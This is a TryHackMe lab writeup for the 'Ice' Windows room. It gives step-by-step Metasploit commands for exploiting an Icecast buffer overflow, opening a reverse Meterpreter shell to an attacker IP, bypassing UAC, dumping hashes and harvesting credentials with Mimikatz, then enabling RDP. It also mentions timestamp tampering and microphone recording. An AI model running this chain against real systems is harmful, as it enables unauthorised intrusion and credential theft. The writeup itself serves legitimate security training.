# ICE — TryHackMe Writeup

NULLSECURE - FROM NULL TO ROOT

**Room:** [Ice](https://tryhackme.com/room/ice)
**Created by:** Darkstar
**Difficulty:** Easy
**Target OS:** Windows 7 (Build 7601, x86) — Hostname: `DARK-PC`
**Category:** Windows Exploitation / Privilege Escalation

---

## 1. Overview

Ice is a beginner-friendly Windows box built around a single core idea: an outdated, unpatched service is all it takes to go from zero access to full SYSTEM control. The target runs a vulnerable **Icecast** streaming media server exposed on a non-standard port, which gives us unauthenticated remote code execution as our entry point. From there, a known local privilege escalation technique lifts us to `NT AUTHORITY\SYSTEM`, and post-exploitation credential harvesting hands us a plaintext account password — clean enough to log back in over RDP like a legitimate user.

This writeup follows that full chain: recon → vulnerability identification → exploitation → privilege escalation → post-exploitation → interactive access.

---

## 2. Recon

Started with a fast port sweep using **Threader3000** to get an initial picture of the attack surface before running a heavier scan:

```bash
threader3000 <TARGET_IP>
```

**Open ports:**

| Port | Service |
|------|---------|
| 135 | MSRPC |
| 139 | NetBIOS-SSN |
| 445 | SMB (Microsoft-DS) |
| 3389 | RDP (ms-wbt-server) |
| 5357 | WSDAPI / HTTP |
| **8000** | **HTTP — Icecast media server** |
| 49152–49184 | Dynamic/ephemeral RPC ports (Windows) |

```
Port scan completed in 0:00:49.968928
```

Followed up with a full service/version scan against the confirmed open ports:

```bash
nmap -sC -sV -sS -p135,139,445,3389,5357,8000,49152,49153,49154,49160,49179,49184 -Pn <TARGET_IP>
```

`-Pn` was used since ICMP is typically filtered on TryHackMe Windows targets. The standard trio (135/139/445) plus 3389 immediately flag this as a Windows host. Port **8000** stands out — it's not a default Windows service port, which makes it the priority target for manual inspection.

---

## 3. Vulnerability Identification

Browsing to `http://<TARGET_IP>:8000` (and checking the service banner from the nmap `-sV` output) identifies the service as an **Icecast streaming media server**. A quick version check shows it's running **Icecast 2.0.1 or earlier**.

Icecast versions ≤ 2.0.1 are affected by **CVE-2004-1561** — an HTTP header parsing buffer overflow discovered by Luigi Auriemma. The server fails to bounds-check the number of headers it processes; sending 32+ HTTP headers in a single request overflows a pointer array and overwrites the saved instruction pointer on Windows builds, leading to remote code execution.

This maps directly to a built-in Metasploit module: **`exploit/windows/http/icecast_header`** ("Icecast Header Overwrite").

---

## 4. Exploitation

```bash
msfconsole -q
search icecast
use 0          # exploit/windows/http/icecast_header

set RHOSTS <TARGET_IP>
set LHOSTS <ATTACKER_IP>
exploit
```

The exploit fires and returns a Meterpreter session running in the context of the Icecast service process — our initial foothold on the box.

```
meterpreter > getuid
meterpreter > getprivs
meterpreter > background
```

Confirm the session and privilege level before moving on to privilege escalation.

---

## 5. Privilege Escalation

With a low-privileged shell in hand, ran the local exploit suggester to enumerate viable privesc paths:

```bash
search suggester
use 0          # post/multi/recon/local_exploit_suggester
set session 1
exploit
```

**Suggested exploits:**

```
exploit/windows/local/bypassuac_comhijack
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move
exploit/windows/local/ms10_092_schelevator
exploit/windows/local/ms13_053_schlamperei
exploit/windows/local/ms13_081_track_popup_menu
exploit/windows/local/ms14_058_track_popup_menu
exploit/windows/local/ms15_051_client_copy_image
exploit/windows/local/ntusermndragover
exploit/windows/local/ppr_flatten_rec
exploit/windows/local/tokenmagic
exploit/windows/persistence/bits
```

Selected **`bypassuac_eventvwr`** — it abuses `eventvwr.exe`'s auto-elevation behavior via registry hijacking to bypass UAC without triggering a prompt:

```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST <ATTACKER_IP>
exploit
```

Result — a fresh, elevated session:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeTcbPrivilege
```

Full SYSTEM access confirmed.

---

## 6. Post-Exploitation

The Icecast process isn't the most stable place to sit, so the session was migrated into a reliable SYSTEM-owned process before doing anything else:

```
meterpreter > ps
meterpreter > migrate -N spoolsv.exe
```

From a stable SYSTEM context, dumped local credentials:

```
meterpreter > hashdump
```

Then loaded **Mimikatz (kiwi)** to pull credentials directly from memory:

```
meterpreter > load kiwi
meterpreter > creds_all
```

Kiwi recovers a plaintext credential for the local user `Dark`:

```
Username: Dark
Password: Password01!
```

**Optional/bonus Meterpreter capabilities** worth knowing for this kind of session (not required to finish the room): `screenshare`, `record_mic`, and `timestomp` for covering file MACE timestamps. (`golden_ticket_create` doesn't apply here — Ice is a standalone workstation, not a domain controller, so there's no `krbtgt` hash to forge a Golden Ticket with.)

To close the loop and demonstrate full interactive access, enabled RDP on the target from the elevated session:

```
use post/windows/manage/enable_rdp
set session <SYSTEM_SESSION_ID>
exploit
```

Then connected directly as `Dark` using the recovered credential:

```bash
xfreerdp3 /compression /cert:ignore +auto-reconnect /v:<TARGET_IP> /u:Dark /p:Password01! +clipboard /sec:rdp
```

🚩 **Flags:** locate and submit `user.txt` / `root.txt` (paths vary by build — typically on the respective account's Desktop). *Insert your captured flag values/screenshots here before publishing.*

---

## 7. Conclusion

| Stage | Technique / Tool | Result |
|---|---|---|
| Recon | Threader3000 + Nmap | Identified non-standard Icecast service on port 8000 |
| Vulnerability ID | Version fingerprinting | Icecast ≤ 2.0.1 → CVE-2004-1561 |
| Initial Access | `exploit/windows/http/icecast_header` | Meterpreter shell in Icecast service context |
| Privilege Escalation | `local_exploit_suggester` → `bypassuac_eventvwr` | `NT AUTHORITY\SYSTEM` |
| Post-Exploitation | `migrate`, `hashdump`, Mimikatz `creds_all` | Local SAM hashes + plaintext credential for `Dark` |
| Lateral/Interactive Access | `enable_rdp` + `xfreerdp3` | Full RDP session as `Dark` |

---

## 8. Attack Chain Summary

```
Icecast ≤2.0.1 Header Overflow (CVE-2004-1561)
        │
        ▼
Meterpreter foothold (Icecast service context)
        │
        ▼
local_exploit_suggester → bypassuac_eventvwr
        │
        ▼
NT AUTHORITY\SYSTEM
        │
        ▼
migrate → spoolsv.exe → hashdump → Mimikatz (kiwi)
        │
        ▼
Plaintext credential recovered (Dark:Password01!)
        │
        ▼
enable_rdp → xfreerdp3 → Full interactive access
```

---

*This walkthrough was performed exclusively against TryHackMe's intentionally vulnerable "Ice" lab environment for educational purposes. Do not use these techniques against any system you do not own or lack explicit written authorization to test.*

**A1GCH ⚔ NullSecure**
